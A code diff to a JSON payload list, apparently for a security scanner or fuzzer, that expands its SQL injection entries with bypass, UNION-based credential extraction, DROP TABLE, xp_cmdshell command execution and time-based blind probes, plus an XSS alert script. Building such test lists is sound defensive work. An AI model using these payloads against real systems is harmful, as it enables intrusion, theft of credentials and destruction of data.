@@ -5,13 +5,28 @@
   "categories": {
     "sql_injection": [
       "' OR '1'='1",
-      "' OR 1=1 --",
-      "'; DROP TABLE users--",
+      "' OR '1'='1' --",
+      "' OR '1'='1' /*",
       "admin'--",
-      "' UNION SELECT NULL--",
+      "1; DROP TABLE users--",
       "1' AND '1'='1",
+      "' UNION SELECT NULL--",
+      "' UNION SELECT username, password FROM users--",
+      "1 OR 1=1",
+      "' OR 'x'='x",
+      "'; EXEC xp_cmdshell('dir')--",
       "1' ORDER BY 1--",
-      "' OR 'x'='x"
+      "1' GROUP BY 1--",
+      "' AND 1=2--",
+      "' OR EXISTS(SELECT 1)--",
+      "' AND SLEEP(5)--",
+      "' OR IF(1=1, SLEEP(5), 0)--",
+      "' OR 1=1#",
+      "\" OR \"1\"=\"1\"--",
+      "') OR ('1'='1'--",
+      "' UNION SELECT 1, @@version--",
+      "' AND updatexml(1,concat(0x7e,version()),1)--",
+      "' OR pg_sleep(5)--"
     ],
     "xss": [
       "<script>alert('XSS')</script>",
